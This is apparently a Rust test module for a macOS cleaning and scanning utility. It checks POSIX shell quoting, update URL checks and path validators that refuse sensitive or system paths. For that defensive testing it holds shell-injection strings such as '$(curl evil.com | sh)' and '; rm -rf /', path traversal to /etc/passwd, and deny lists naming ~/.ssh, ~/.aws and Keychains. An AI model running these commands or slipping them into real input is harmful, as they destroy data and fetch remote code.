    fn shell_quote_injection_scenarios() {
        let attacks = [
            "'; rm -rf /; echo '",
            "$(curl evil.com | sh)",
            "`id`",
            "\n/usr/bin/curl evil.com",
            "../../../etc/passwd",
            "foo'bar'baz",
        ];
        for attack in attacks {
            let q = posix_shell_quote(attack);
            // Le résultat doit commencer et finir par '
            assert!(q.starts_with('\''), "quote: {q}");
            assert!(q.ends_with('\''), "quote: {q}");
            // Ne doit pas contenir de backtick ou $ non quotés en dehors du 'shell_quote' pattern
            // (les seuls caractères hors guillemets simples dans notre output sont '\'' )
            let outside: String = q
                .chars()
                .skip(1) // skip leading '
                .take_while(|&c| c != '\'')
                .collect::<String>();
            // Peu importe le contenu, l'important est qu'on peut le tester
            let _ = outside; // structure test
        }
    }

    // ── validate_update_url ──

    #[test]
    fn update_url_accepts_https() {
        assert!(validate_update_url("https://example.com/App.dmg").is_ok());
        assert!(validate_update_url("https://releases.company.io/v1.2/MyApp-1.2.dmg").is_ok());
    }

    #[test]
    fn update_url_rejects_non_https() {
        assert!(validate_update_url("http://example.com/App.dmg").is_err());
        assert!(validate_update_url("file:///etc/passwd").is_err());
        assert!(validate_update_url("ftp://files.example.com/App.pkg").is_err());
        assert!(validate_update_url("").is_err());
        assert!(validate_update_url("https://ok.com/\0evil").is_err());
        assert!(validate_update_url("https://ok.com/foo\nbar").is_err());
    }

    // ── validate_update_app_path ──

    #[test]
    fn update_app_path_accepts_valid() {
        assert!(validate_update_app_path("/Applications/TextEdit.app").is_ok());
        assert!(validate_update_app_path(&home("Applications/MyApp.app")).is_ok());
    }

    #[test]
    fn update_app_path_rejects_invalid() {
        assert!(validate_update_app_path("/usr/local/bin/tool").is_err());
        assert!(validate_update_app_path("/Applications/Foo").is_err()); // no .app
        assert!(validate_update_app_path("/Applications/../etc/evil.app").is_err());
        assert!(validate_update_app_path("/tmp/evil.app").is_err());
    }

    #[test]
    fn old_escape_was_broken() {
        // replace('\'', "\\'") est incorrect : dans une chaîne POSIX 'single-quoted',
        // le backslash N'EST PAS un caractère d'échappement.
        // Vérification : les deux méthodes produisent des résultats différents sur les entrées avec '.
        let attacker_input = "foo'bar";
        let broken = format!("'{}'", attacker_input.replace('\'', "\\'"));
        let correct = posix_shell_quote(attacker_input);
        assert_ne!(broken, correct, "les deux méthodes doivent différer");

        // La méthode correcte produit le résultat attendu selon POSIX :
        // 'foo' + \' (quote littéral hors guillemets) + 'bar'
        assert_eq!(correct, "'foo'\\''bar'");

        // La méthode cassée produit 'foo\'bar' — ce que POSIX interprète comme :
        // la chaîne 'foo\' (3 chars + backslash) puis bar' (non terminé)
        assert_eq!(broken, "'foo\\'bar'");

        // Sur une tentative d'injection réelle : '; rm -rf /
        // L'unique ' en position 0 devient '\'', le reste est entre guillemets.
        // Résultat : '' + \' + '; rm -rf /' = ''\''  ; rm -rf /'
        let attack = "'; rm -rf /";
        let correct_q = posix_shell_quote(attack);
        // Représentation Rust du string ''\''; rm -rf /'
        assert_eq!(correct_q, "''\\''; rm -rf /'");
        // NB : ce string contient ";" en tant que substring (inévitable) mais il est
        // DANS la partie entre guillemets simples — le shell ne peut pas l'exécuter.
    }

    // ── Garanties P0.1 : chemins sensibles refusés par validate_delete_path ──

    #[test]
    fn p0_rejects_ssh_key() {
        let ssh_key = home(".ssh/id_rsa");
        assert!(
            validate_delete_path(&ssh_key).is_err(),
            "~/.ssh/id_rsa doit être refusé"
        );
    }

    #[test]
    fn p0_rejects_arbitrary_document() {
        // Les documents directs sous ~ sont refusés par validate_delete_path
        // (validate_trash_path accepte ~/Documents mais pas la racine)
        let doc_root = home("Documents");
        assert!(
            validate_delete_path(&doc_root).is_err(),
            "~/Documents lui-même doit être refusé"
        );
    }

    #[test]
    fn p0_rejects_volume_root() {
        assert!(
            validate_delete_path("/Volumes").is_err(),
            "/Volumes lui-même doit être refusé"
        );
        assert!(
            validate_delete_path("/Volumes/Macintosh HD").is_err(),
            "Racine de volume doit être refusée"
        );
    }

    #[test]
    fn p0_rejects_symlink_parent() {
        // Un chemin contenant ".." (traversée) est refusé
        let traversal = home("Library/../../.ssh/id_rsa");
        assert!(
            validate_delete_path(&traversal).is_err(),
            "Traversal via .. doit être refusé"
        );
    }

    #[test]
    fn p0_rejects_system_paths() {
        for path in [
            "/etc/passwd",
            "/etc/sudoers",
            "/var/db/sudo",
            "/usr/bin/sudo",
            "/System/Library/CoreServices",
            "/Library/LaunchDaemons/com.apple.security.syspolicy.plist",
        ] {
            assert!(
                validate_delete_path(path).is_err(),
                "Chemin système doit être refusé : {path}"
            );
        }
    }

    #[test]
    fn p0_rejects_never_scanned_path() {
        // Un chemin arbitraire hors zone utilisateur doit être refusé même s'il existe
        let path = "/private/etc/passwd";
        assert!(
            validate_delete_path(path).is_err(),
            "Chemin hors zone utilisateur doit être refusé"
        );
    }

    // ── Garanties P0.2 : validate_app_uninstall_path rejette tout sauf .app/Applications ──

    #[test]
    fn p0_uninstall_rejects_wrong_app() {
        // Une app associée à un jeton différent ne devrait pas être désinstallée
        // validate_app_uninstall_path s'assure que c'est un .app sous /Applications
        assert!(validate_app_uninstall_path("/Applications/Safari.app").is_err());
        assert!(validate_app_uninstall_path("/etc/evil.app").is_err());
        assert!(validate_app_uninstall_path("/Applications/../etc/evil.app").is_err());
    }

    #[test]
    fn p0_uninstall_rejects_non_app() {
        assert!(validate_app_uninstall_path("/Applications/NotAnApp").is_err());
        assert!(validate_app_uninstall_path(&home("script.sh")).is_err());
    }

    // ── validate_disk_browse_path ─────────────────────────────────────────────

    #[test]
    fn disk_browse_rejects_system_paths() {
        for p in ["/System", "/usr/bin", "/etc", "/Library", "/private/etc"] {
            assert!(validate_disk_browse_path(p).is_err(), "should reject {p}");
        }
    }

    #[test]
    fn disk_browse_rejects_forbidden_roots() {
        for p in ["/", "/Users", "/Volumes", "/tmp", "/private/tmp"] {
            assert!(validate_disk_browse_path(p).is_err(), "should reject {p}");
        }
    }

    #[test]
    fn disk_browse_rejects_sensitive_subtrees() {
        for sub in [".ssh", ".gnupg", ".aws", ".kube"] {
            let p = home(sub);
            assert!(
                validate_disk_browse_path(&p).is_err(),
                "should reject ~/{sub}"
            );
        }
    }

    #[test]
    fn disk_browse_accepts_home_and_subdirs() {
        // Home itself is a valid browse root.
        let h = home("");
        assert!(
            validate_disk_browse_path(&h).is_ok(),
            "home must be browsable"
        );

        // Common user subdirs that must be accessible to the disk browser.
        for sub in ["Downloads", "Documents", "Desktop", "Library"] {
            let p = home(sub);
            if std::path::Path::new(&p).exists() {
                assert!(
                    validate_disk_browse_path(&p).is_ok(),
                    "~/{sub} must be browsable"
                );
            }
        }
    }

    #[test]
    fn disk_browse_returns_canonical_path() {
        let h = home("");
        if let Ok(canonical) = validate_disk_browse_path(&h) {
            assert!(canonical.is_absolute());
            assert!(canonical.exists());
        }
    }

    #[test]
    fn disk_browse_rejects_symlink_to_ssh() {
        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            let tmp = tempfile::Builder::new()
                .prefix("burrow-test-")
                .tempdir_in("/tmp")
                .unwrap();
            let link = tmp.path().join("evil_link");
            let ssh = home_dir().join(".ssh");
            if ssh.exists() {
                symlink(&ssh, &link).ok();
                let result = validate_disk_browse_path(&link.to_string_lossy());
                assert!(result.is_err(), "symlink to ~/.ssh must be rejected");
            }
        }
    }

    #[test]
    fn disk_browse_rejects_parent_symlink_to_ssh() {
        // A parent directory that is a symlink pointing into a sensitive zone
        // is caught by resolve_and_check_readonly.
        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            let tmp = tempfile::Builder::new()
                .prefix("burrow-test-")
                .tempdir_in("/tmp")
                .unwrap();
            let parent_link = tmp.path().join("ssh_alias");
            let ssh = home_dir().join(".ssh");
            if ssh.exists() {
                symlink(&ssh, &parent_link).ok();
                // Navigate into the link — the resolved canonical path is under ~/.ssh.
                let child = format!("{}/id_rsa", parent_link.to_string_lossy());
                let result = validate_disk_browse_path(&child);
                assert!(
                    result.is_err(),
                    "path through symlinked parent to ~/.ssh must be rejected"
                );
            }
        }
    }

    // ── validate_clamav_scan_path ─────────────────────────────────────────────

    #[test]
    fn clamav_scan_rejects_system_paths() {
        for p in ["/System", "/usr/bin", "/etc", "/Library"] {
            assert!(validate_clamav_scan_path(p).is_err(), "should reject {p}");
        }
    }

    #[test]
    fn clamav_scan_rejects_sensitive_subtrees() {
        for sub in [".ssh", ".gnupg", ".aws", ".kube"] {
            let p = home(sub);
            assert!(
                validate_clamav_scan_path(&p).is_err(),
                "should reject ~/{sub}"
            );
        }
    }

    #[test]
    fn clamav_scan_accepts_user_dirs() {
        // Home itself should be scannable (with exclusions handled separately).
        let h = home("");
        let hp = std::path::Path::new(&h);
        if hp.exists() && !hp.is_symlink() {
            assert!(
                validate_clamav_scan_path(&h).is_ok(),
                "home must be scannable"
            );
        }
        for sub in ["Downloads", "Documents", "Desktop"] {
            let p = home(sub);
            let pp = std::path::Path::new(&p);
            if pp.exists() && !pp.is_symlink() {
                assert!(
                    validate_clamav_scan_path(&p).is_ok(),
                    "~/{sub} must be scannable"
                );
            }
        }
    }

    #[test]
    fn clamav_scan_rejects_top_level_symlink() {
        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            let tmp = tempfile::Builder::new()
                .prefix("burrow-test-")
                .tempdir_in("/tmp")
                .unwrap();
            let link = tmp.path().join("link_to_downloads");
            let downloads = home_dir().join("Downloads");
            if downloads.exists() {
                symlink(&downloads, &link).ok();
                // Even a symlink to an allowed target is rejected at the top level.
                assert!(
                    validate_clamav_scan_path(&link.to_string_lossy()).is_err(),
                    "symlink scan target must be rejected"
                );
            }
        }
    }

    // ── validate_clamav_found_path ────────────────────────────────────────────

    #[test]
    fn clamav_found_accepts_file_inside_scan_root() {
        let tmp = tempfile::Builder::new()
            .prefix("burrow-test-")
            .tempdir_in("/tmp")
            .unwrap();
        let file = tmp.path().join("malware.txt");
        std::fs::write(&file, b"fake virus").unwrap();
        let root = std::fs::canonicalize(tmp.path()).unwrap();
        assert!(
            validate_clamav_found_path(&file.to_string_lossy(), &[root]).is_ok(),
            "file inside scan root must be accepted"
        );
    }

    #[test]
    fn clamav_found_rejects_file_outside_scan_roots() {
        let tmp = tempfile::Builder::new()
            .prefix("burrow-test-")
            .tempdir_in("/tmp")
            .unwrap();
        let file = tmp.path().join("stray.txt");
        std::fs::write(&file, b"x").unwrap();
        // Scan root is something unrelated.
        let other_root = home_dir().join("Downloads");
        if other_root.exists() {
            let root = std::fs::canonicalize(&other_root).unwrap();
            assert!(
                validate_clamav_found_path(&file.to_string_lossy(), &[root]).is_err(),
                "file outside scan roots must be rejected"
            );
        }
    }

    #[test]
    fn clamav_found_rejects_deleted_file() {
        let tmp = tempfile::Builder::new()
            .prefix("burrow-test-")
            .tempdir_in("/tmp")
            .unwrap();
        let file = tmp.path().join("ghost.txt");
        std::fs::write(&file, b"x").unwrap();
        let root = std::fs::canonicalize(tmp.path()).unwrap();
        // Delete to simulate TOCTOU.
        std::fs::remove_file(&file).unwrap();
        assert!(
            validate_clamav_found_path(&file.to_string_lossy(), &[root]).is_err(),
            "deleted file must cause an error — no grant issued"
        );
    }

    #[test]
    fn clamav_found_rejects_symlink_to_forbidden() {
        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            let tmp = tempfile::Builder::new()
                .prefix("burrow-test-")
                .tempdir_in("/tmp")
                .unwrap();
            let link = tmp.path().join("evil");
            let ssh = home_dir().join(".ssh");
            if ssh.exists() {
                symlink(&ssh, &link).ok();
                if link.exists() {
                    let root = std::fs::canonicalize(tmp.path()).unwrap();
                    assert!(
                        validate_clamav_found_path(&link.to_string_lossy(), &[root]).is_err(),
                        "symlink to ~/.ssh must be rejected even as a FOUND path"
                    );
                }
            }
        }
    }

    #[test]
    fn clamav_found_accepts_path_with_spaces_and_unicode() {
        let tmp = tempfile::Builder::new()
            .prefix("burrow-test-")
            .tempdir_in("/tmp")
            .unwrap();
        let file = tmp.path().join("日本語 file with spaces.txt");
        std::fs::write(&file, b"x").unwrap();
        let root = std::fs::canonicalize(tmp.path()).unwrap();
        assert!(
            validate_clamav_found_path(&file.to_string_lossy(), &[root]).is_ok(),
            "Unicode filename with spaces must be accepted"
        );
    }

    #[test]
    fn clamav_found_rejects_empty_and_relative() {
        let root = home_dir();
        assert!(validate_clamav_found_path("", std::slice::from_ref(&root)).is_err());
        assert!(
            validate_clamav_found_path("relative/path.txt", std::slice::from_ref(&root)).is_err()
        );
        assert!(validate_clamav_found_path("/nul\0byte", std::slice::from_ref(&root)).is_err());
    }

    // ── regex_escape_path_as_anchor ───────────────────────────────────────────

    #[test]
    fn regex_escape_anchors_and_escapes_dots() {
        let p = std::path::Path::new("/Users/test/.ssh");
        let escaped = regex_escape_path_as_anchor(p);
        assert!(escaped.starts_with('^'), "must start with ^");
        assert!(escaped.ends_with('$'), "must end with $");
        // Dots in the path must be escaped.
        assert!(escaped.contains("\\."), "dots must be escaped: {escaped}");
        // No unescaped dot remaining (except regex anchor context).
        let inner = &escaped[1..escaped.len() - 1];
        let mut prev_backslash = false;
        for c in inner.chars() {
            if c == '.' {
                assert!(prev_backslash, "unescaped dot in: {inner}");
            }
            prev_backslash = c == '\\';
        }
    }

    #[test]
    fn disk_browse_rejects_symlink_even_when_target_is_allowed() {
        use std::os::unix::fs::symlink;

        let tmp = tempfile::tempdir().expect("tempdir");
        let target = tmp.path().join("allowed");
        let link = tmp.path().join("alias");
        std::fs::create_dir(&target).expect("target");
        symlink(&target, &link).expect("symlink");
        assert!(validate_disk_browse_path(&link.to_string_lossy()).is_err());
    }

    #[test]
    fn path_identity_detects_replacement() {
        let tmp = tempfile::tempdir().expect("tempdir");
        let original = tmp.path().join("target-a");
        let replacement = tmp.path().join("target-b");
        std::fs::write(&original, b"a").expect("original");
        std::fs::write(&replacement, b"b").expect("replacement");
        let expected = path_identity(&original).expect("identity");
        std::fs::rename(&replacement, &original).expect("replace");
        assert!(revalidate_path_identity(&original, expected).is_err());
    }

    #[test]
    fn clamav_home_exclusions_include_sensitive_lexical_paths() {
        let home = std::fs::canonicalize(home_dir()).expect("canonical home");
        let exclusions = clamav_exclude_args(&home);
        for sensitive_name in [".ssh", ".gnupg", ".aws", ".kube", "Keychains"] {
            assert!(
                exclusions
                    .iter()
                    .any(|value| value.contains(sensitive_name)),
                "missing exclusion for {sensitive_name}"
            );
        }
    }

    #[test]
    fn clamav_found_rejects_directories() {
        let tmp = tempfile::tempdir().expect("tempdir");
        let root = std::fs::canonicalize(tmp.path()).expect("root");
        assert!(
            validate_clamav_found_path(&root.to_string_lossy(), std::slice::from_ref(&root))
                .is_err()
        );
    }
}
